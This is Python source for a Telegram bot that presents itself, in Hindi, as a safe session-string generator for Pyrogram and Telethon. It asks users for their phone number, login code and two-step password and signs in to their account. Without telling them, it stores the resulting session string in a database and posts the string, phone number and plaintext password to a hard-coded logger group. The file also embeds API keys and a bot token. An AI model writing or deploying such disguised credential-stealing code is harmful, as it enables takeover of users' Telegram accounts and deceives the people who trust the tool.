import time
import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import sqlite3

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706   

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 SQLite Database Connection with Timeout
def get_db_connection():
    return sqlite3.connect('session_data.db', timeout=10.0)  # Timeout after 10 seconds

# 🔹 Ensure session_logs table is created
def create_session_table():
    with get_db_connection() as db_connection:
        cursor = db_connection.cursor()
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS session_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone TEXT NOT NULL,
            session_string TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        db_connection.commit()

# ✅ /start Command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "**👋 Session Generator Bot में आपका स्वागत है!**\n\n"
        "🔹 **Pyrogram & Telethon के लिए Telegram Session Strings जनरेट करें**\n"
        "🔹 **सुरक्षित और उपयोग में आसान**\n\n"
        "**📌 जारी रखने के लिए एक विकल्प चुनें:**",
        buttons=[
            [Button.inline("🎭 Pyrogram Session जनरेट करें", b"generate_pyro")],
            [Button.inline("🎭 Telethon Session जनरेट करें", b"generate_telethon")]
        ]
    )

# ✅ Pyrogram Session जनरेट करना
@bot.on(events.CallbackQuery(pattern=b"generate_pyro"))
async def ask_phone_pyro(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_pyro"}
    await event.respond("📱 **कृपया अपना फोन नंबर देश कोड के साथ डालें (उदाहरण: +919876543210)**")

# ✅ Telethon Session जनरेट करना
@bot.on(events.CallbackQuery(pattern=b"generate_telethon"))
async def ask_phone_telethon(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_telethon"}
    await event.respond("📱 **कृपया अपना फोन नंबर देश कोड के साथ डालें (उदाहरण: +919876543210)**")

# 🔹 उपयोगकर्ता इनपुट प्रोसेस करना
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: फोन नंबर डालें
    if step == "phone_pyro" or step == "phone_telethon":
        phone_number = event.message.text.strip()
        if not phone_number:  # यह सुनिश्चित करना कि फोन नंबर डाला गया है
            await event.respond("❌ **कृपया एक वैध फोन नंबर डालें।**")
            return

        user_sessions[user_id]["phone"] = phone_number  # फोन नंबर को स्टोर करें

        if step == "phone_pyro":
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone_number)
        else:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone_number)

        user_sessions[user_id]["client"] = client  
        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
        user_sessions[user_id]["step"] = "otp"
        await event.respond("🔹 **OTP भेजा गया! कृपया प्राप्त OTP डालें।**")

    # ✅ Step 2: OTP डालें
    elif step == "otp":
        otp_code = event.message.text.strip()
        phone_number = user_sessions[user_id].get("phone")  # फोन नंबर को प्राप्त करें
        if not otp_code:  # यह सुनिश्चित करना कि OTP डाला गया है
            await event.respond("❌ **कृपया एक वैध OTP डालें।**")
            return

        client = user_sessions[user_id]["client"]
        phone_code_hash = user_sessions[user_id]["phone_code_hash"]  

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()  

            # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
            create_session_table()  
            with get_db_connection() as db_connection:
                cursor = db_connection.cursor()
                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
                               (user_id, phone_number, session_string))
                db_connection.commit()

            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 नया Session जनरेट किया गया!**\n\n**👤 उपयोगकर्ता:** `{user_id}`\n**📞 फोन:** `{phone_number}`\n**🔑 Session:** `{session_string}`")

            await event.respond(f"✅ **आपका Session String:**\n\n```{session_string}```\n\n🔒 **इसे सुरक्षित रखें!**")
            del user_sessions[user_id]

        except (SessionPasswordNeededError):
            user_sessions[user_id]["step"] = "password"
            await event.respond("🔑 **कृपया अपना Telegram पासवर्ड डालें (2-Step Verification)।**")
        
        except Exception as e:
            await event.respond(f"❌ **त्रुटि:** {str(e)}\n🔄 कृपया फिर से प्रयास करें!")
            del user_sessions[user_id]

    # ✅ Step 3: 2FA पासवर्ड डालें
    elif step == "password":
        password = event.message.text.strip()
        if not password:  # यह सुनिश्चित करना कि पासवर्ड डाला गया है
            await event.respond("❌ **कृपया एक वैध पासवर्ड डालें।**")
            return

        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()  

            # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
            create_session_table()  
            with get_db_connection() as db_connection:
                cursor = db_connection.cursor()
                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
                               (user_id, user_sessions[user_id]["phone"], session_string))
                db_connection.commit()

            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 नया Session (2FA के साथ)!**\n\n**👤 उपयोगकर्ता:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **पासवर्ड का उपयोग किया गया:** `{password}`")

            await event.respond(f"✅ **आपका Session String:**\n\n```{session_string}```\n\n🔒 **इसे सुरक्षित रखें!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **त्रुटि:** {str(e)}\n🔄 कृपया फिर से प्रयास करें!")

# 🔹 बॉट को चलाना
print("🚀 बॉट चल रहा है...")
bot.run_until_disconnected()
